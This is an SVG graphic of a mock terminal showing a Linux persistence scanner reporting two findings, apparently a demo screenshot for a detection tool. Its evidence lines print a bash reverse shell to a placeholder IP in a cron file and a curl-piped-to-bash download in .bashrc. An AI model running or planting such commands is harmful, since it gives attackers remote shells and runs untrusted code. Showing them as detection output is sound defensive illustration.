<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 560" width="100%" height="100%">
  <defs>
    <style>
      .bg { fill: #0d1117; }
      .bar { fill: #161b22; }
      .btn-red { fill: #ff5f56; }
      .btn-yel { fill: #ffbd2e; }
      .btn-grn { fill: #27c93f; }
      .title { fill: #8b949e; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-size: 13px; text-anchor: middle; font-weight: 500; }
      .mono { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace; font-size: 13px; line-height: 20px; }
      .prompt { fill: #58a6ff; font-weight: 600; }
      .cmd { fill: #f0f6fc; font-weight: 600; }
      .dim { fill: #6e7681; }
      .text { fill: #c9d1d9; }
      .cyan { fill: #39c5bb; font-weight: 600; }
      .orange { fill: #f0883e; font-weight: 600; }
      .red { fill: #f85149; font-weight: 600; }
      .bold { font-weight: bold; }
    </style>
  </defs>
  <!-- Window frame -->
  <rect class="bg" width="900" height="560" rx="10" stroke="#30363d" stroke-width="1"/>
  <rect class="bar" width="900" height="38" rx="10"/>
  <rect class="bar" y="28" width="900" height="10"/>
  <!-- Window buttons -->
  <circle class="btn-red" cx="20" cy="19" r="6"/>
  <circle class="btn-yel" cx="40" cy="19" r="6"/>
  <circle class="btn-grn" cx="60" cy="19" r="6"/>
  <text class="title" x="450" y="23">audit@linux-node-01: ~ (Persistence Findings)</text>

  <!-- Terminal content -->
  <text class="mono" x="25" y="70">
    <tspan class="prompt">audit@linux-node-01:~$ </tspan><tspan class="cmd">persisthunt scan --category cron,shell</tspan>
  </text>
  <text class="mono cyan bold" x="25" y="105">PersistHunt</text>
  <text class="mono dim" x="25" y="125">Linux Persistence Detection Framework</text>
  <text class="mono orange bold" x="25" y="150">&#x26A0; Scan complete.</text>

  <text class="mono bold text" x="25" y="180">Findings: 2</text>
  <text class="mono orange bold" x="25" y="200">HIGH: 2</text>
  <text class="mono orange bold" x="25" y="225">Risk Score: 2.4/10</text>

  <text class="mono cyan bold" x="25" y="260">=== Finding Summaries ===</text>

  <!-- Finding 1 -->
  <text class="mono" x="25" y="290">
    <tspan class="bold text">1. </tspan><tspan class="orange bold">[HIGH]</tspan> <tspan class="text bold">PH-CRON-001 - Interactive network utility or raw socket redirection</tspan>
  </text>
  <text class="mono text" x="45" y="315"><tspan class="dim">Location: </tspan>/etc/cron.d/sync_job:3</text>
  <text class="mono text" x="45" y="335"><tspan class="dim">Evidence: </tspan><tspan class="red">/bin/bash -i &gt;&amp; /dev/tcp/198.51.100.1/4444 0&gt;&amp;1</tspan></text>
  <text class="mono text" x="45" y="355"><tspan class="dim">Action:   </tspan>Investigate network connections and remove unauthorized cron jobs.</text>

  <!-- Finding 2 -->
  <text class="mono" x="25" y="395">
    <tspan class="bold text">2. </tspan><tspan class="orange bold">[HIGH]</tspan> <tspan class="text bold">PH-SHELL-002 - Remote download piped directly into shell in startup script</tspan>
  </text>
  <text class="mono text" x="45" y="420"><tspan class="dim">Location: </tspan>/home/audit_user/.bashrc:42</text>
  <text class="mono text" x="45" y="440"><tspan class="dim">Evidence: </tspan><tspan class="red">curl -fsSL https://updates.example.org/patch.sh | bash</tspan></text>
  <text class="mono text" x="45" y="460"><tspan class="dim">Action:   </tspan>Audit startup script remote sources and verify script integrity.</text>

  <text class="mono dim" x="25" y="505">Exited with status code: 2 (THREAT_DETECTED)</text>
</svg>
